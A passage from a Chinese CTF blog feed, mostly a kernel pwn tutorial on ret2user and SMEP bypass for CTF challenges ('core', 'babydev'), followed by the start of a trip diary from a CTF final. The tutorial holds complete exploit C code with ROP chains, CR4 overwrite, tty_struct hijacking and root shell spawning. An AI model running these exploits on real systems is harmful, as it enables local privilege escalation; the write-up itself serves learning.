%1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] ret2user [*]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这两份 <code>EXP</code> 其实很像，只有执行 <code>commit_creds(prepare_kernel_cred(0))</code> 函数的部分不一样（如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但有意思的是，无法在此处执行用户态的函数，因为我调用了 <code>puts</code> 函数，发现内核崩溃了，我认为其原因是状态寄存器没有进行切换所导致的，因此还得再回到内核中去恢复状态寄存器的值，最终执行用户态中的 <code>system(&quot;/bin/sh&quot;)</code></p><h2 id="bypass-SMEP">bypass-SMEP</h2><h3 id="前置知识">前置知识</h3><p><code>SMEP</code> 全称 <code>Supervisor Mode Execution Protection</code> ，当 <code>CPU</code> 处于 <code>ring0</code> 模式时执行用户空间的代码会触发页错误（该防御机制会将页表中的用户空间内存页标记为不可执行），目的是为了防止 <code>ret2user</code>。在启动时， <code>-cpu</code> 选项下加入 <code>+smep</code> 启用该防御机制，在 <code>-append</code> 选项下加入 <code>nosmep</code> 禁用该机制。</p><p>系统会根据 <code>CR4</code> 寄存器中第二十位的值来判断 <code>SMEP</code> 保护是否开启（ <code>1</code> 为开启，<code>0</code> 为关闭 ）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211706032.png" alt="image-20230421170620883"></p><p>在打开 <code>/dev/ptmx</code> 设备时，会分配一个 <code>tty_struct</code> 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>其中关注的是 <code>const struct tty_operations *ops</code> 指针，该指针指向了结构体 <code>tty_operations</code> （定义如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>如果能劫持掉上面的指针，在对 <code>/dev/ptmx</code> 文件进行 <code>write</code> 或者 <code>read</code> 等操作时就可以跳转我们指定的函数指针执行，有点类似于 <code>FSOP</code></p><h3 id="利用思路">利用思路</h3><p>在劫持的位置先进行第一次迁移，<code>rax</code> 正好是 <code>fake_tty_operation</code> 的地址，于是，我们把栈转移到 <code>fake_tty_operations</code> 里,此处是可以放一少部分 <code>gadget</code> ，用这部分进行第二次迁移，迁移到堆块中的 <code>rop</code> 链上，用 <code>mov cr4,rdi</code> 这个 <code>gadget</code> 来改变 <code>cr4</code> 寄存器的值从而绕过 <code>SMEP</code> 保护，随后打一个 <code>ret2user</code> 即可完成提权。</p><p>此处的 <code>EXP</code> 用的是 <a href="https://blog.csdn.net/seaaseesa/article/details/104577501">ha1vk</a>  师傅的，因为这题已经做过了，并且 <code>ha1vk</code> 师傅写的也很详细，再写一遍也没有什么大的改变</p><h3 id="EXP-v3">EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//tty_struct结构体的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80</span></span><br><span class="line"><span class="comment">//pop rdi ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI 0xffffffff810d238d</span></span><br><span class="line"><span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS 0xffffffff81063694</span></span><br><span class="line"><span class="comment">//iretq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xFFFFFFFF8181A797</span></span><br><span class="line"><span class="comment">//commit_creds函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="comment">// prepare_kernel_cred</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a1810</span></span><br><span class="line"><span class="comment">//mov rsp, rax;dec ebx;ret，做栈迁移用</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX 0xffffffff8100ce6e</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//函数指针</span></span><br><span class="line">   <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;</span><br><span class="line">   <span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Rooted!!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Root Fail!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*保存用户态的寄存器到变量里*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveUserState</span><span class="params">()</span> &#123;</span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">           <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//保存用户态寄存器</span></span><br><span class="line">   saveUserState();</span><br><span class="line">   <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//申请一个tty_struct大小的堆</span></span><br><span class="line">   ioctl(fd1,<span class="number">0x10001</span>,TTY_STRUCT_SIZE);</span><br><span class="line">   <span class="comment">//释放这个堆</span></span><br><span class="line">   close(fd1);</span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> fake_tty_operations[<span class="number">35</span>];</span><br><span class="line">   <span class="comment">/*for (int i=0;i&lt;35;i++) &#123;</span></span><br><span class="line"><span class="comment">      fake_tty_operations[i] = 0xffffffffc0000000 + i;</span></span><br><span class="line"><span class="comment">   &#125;*/</span></span><br><span class="line">   <span class="comment">//这个位置是write函数的指针，经过调试，我们发现当调用这个函数时，rax正好是fake_tty_operation的地址，于是，我们把栈转移到</span></span><br><span class="line">   <span class="comment">//fake_tty_operations里</span></span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = MOV_RSP_RAX;</span><br><span class="line">   <span class="comment">//栈转移到fake_tty_operations里后，我们继续做一次转移，把转转移到我们的rop数组里，执行ROP</span></span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = POP_RAX;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = MOV_RSP_RAX;</span><br><span class="line"> </span><br><span class="line">   <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">   <span class="comment">//这个操作会申请tty_struct的空间，也就是会申请到我们之前释放的那个堆里，我们可以用fd2来对它操作</span></span><br><span class="line">   <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="comment">//我们先把原始的tty_struct前面的数据读出来，存储</span></span><br><span class="line">   read(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="comment">//修改const struct tty_operations *ops;指针，指向我们伪造的tty_operations</span></span><br><span class="line">   fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">   <span class="comment">//把篡改过的tty_struct写回去</span></span><br><span class="line">   write(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">   write(fd_tty,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考文章">参考文章</h3><p><a href="https://www.secpulse.com/archives/175110.html">Kernel pwn 基础教程之 ret2usr 与 bypass_smep - SecPulse.COM | 安全脉搏</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/98937960">(47条消息) Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep_钞sir的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104577501">(47条消息) linux kernel pwn学习之伪造tty_struct执行任意函数_ha1vk的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/98520140?spm=1001.2014.3001.5502">(47条消息) Linux Kernel Exploit 内核漏洞学习(2)-ROP_钞sir的博客-CSDN博客</a></p><p><a href="https://ama2in9.top/2020/09/03/kernel/">Kernel Pwn从入门到放弃 | Ama2in9</a></p><p><a href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">2018强网杯 core | X3h1n</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-ROP </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态线下游记</title>
      <link href="/posts/b0250b87.html"/>
      <url>/posts/b0250b87.html</url>
      
        <content type="html"><![CDATA[<h3 id="启程：">启程：</h3><p>在强网拟态线上赛拿到了进入决赛的资格，因为疫情原因大家都以为决赛会在线上，而起初也确实如此，赛方说是决赛也进行线上赛，不过随着国家对于防疫政策的放开，在临近决赛的时候赛方最终决定可以出十支队伍来南京参加线下赛，而其他五十支队伍在线上进行。</p><p>菜鸡的我自然是渴望线下赛的，并且在家里也没有什么事情(除了学车和考试…),最终决定前往南京参加线下赛并且与平常交流甚多的师傅们见面。于是买票，出发，前往南京！</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212191125243.png" alt="image-20221219112522111"></p><p>该说不说，因为路费报销限额是1500，坐高铁一等座是真的香，然后外出也不用考虑是地铁倒公交啥的，直接出租车就是冲。</p><h3 id="见面：">见面：</h3><p>去到酒店见到了平常线上经常交流的师傅们(h1J4cker师傅 winmt师傅还有三哈师傅等等)。winmt师傅实在是太高辣，一米九多~</p><p>酒店确实大，头两次只能靠着箭头标志找到房间，酒店房间也挺不错的</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221116485.jpg" alt="img"></p><p>陆陆续续人齐了之后先去医院排了一个半小时的队伍做了核酸，完事之后去聚餐吃了火锅</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221112652.jpg" alt="img"></p><h3 id="比赛：">比赛：</h3><p>第二天起来先去干了早饭，说实话这个自助的早餐确实牛皮，吃了五天不重样的早餐(馄饨，汤面，灌汤包，蔬菜沙拉，小笼包，干煸豆角等等太多了记不清)</p><p>接着做了第二班车去了比赛会场</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221121829.jpg" alt="img" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221122695.jpg" alt="img" style="zoom:50%;" /><p>上午准备了下环境，然后是开幕式好多领导上去讲话 比赛是十二点开始，为了尽量不影响比赛肯定是午餐在十二点前提供，又是干饭…</p><p>比赛正式开始之后，我记得是有三个赛道，一个赛道放的是CTF题目，PWN有四道题，我和h1师傅一人做了一道，我打的是一个猜测随机数+SSP 